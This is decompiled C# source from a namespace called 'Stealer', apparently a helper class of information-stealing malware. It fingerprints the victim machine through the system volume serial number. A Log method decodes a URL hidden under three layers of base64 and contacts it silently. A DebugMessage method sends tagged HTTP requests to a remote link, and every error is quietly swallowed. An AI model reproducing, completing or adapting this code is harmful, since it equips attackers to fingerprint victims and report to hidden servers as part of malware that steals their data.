using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;

namespace Stealer
{
	// Token: 0x02000019 RID: 25
	internal class Helper
	{
		// Token: 0x0600006A RID: 106 RVA: 0x000093C0 File Offset: 0x000075C0
		public static string Hwid()
		{
			string result;
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
				managementObject.Get();
				char[] array = managementObject["VolumeSerialNumber"].ToString().ToCharArray();
				Array.Reverse(array);
				result = Convert.ToBase64String(Encoding.UTF8.GetBytes(array.ToString())).Replace("=", "").ToUpper();
			}
			catch (Exception)
			{
				result = Convert.ToBase64String(Encoding.UTF8.GetBytes(Helper.RandomString())).Replace("=", "").ToUpper();
			}
			return result;
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00009484 File Offset: 0x00007684
		public static string RandomString()
		{
			return Path.GetRandomFileName().Replace(".", "");
		}

		// Token: 0x0600006C RID: 108 RVA: 0x000094AC File Offset: 0x000076AC
		public static void Log(string s)
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(s)))))));
			}
			catch
			{
			}
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00009510 File Offset: 0x00007710
		public static void DebugMessage(string link, string ua, string reff)
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(link);
				httpWebRequest.Headers.Add("Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
				httpWebRequest.UserAgent = ua;
				httpWebRequest.Referer = "fleximwithrocket [" + reff + "]";
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8))
				{
					string text = streamReader.ReadToEnd();
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400000F RID: 15
		private static Mutex InstanceCheckMutex;
	}
}
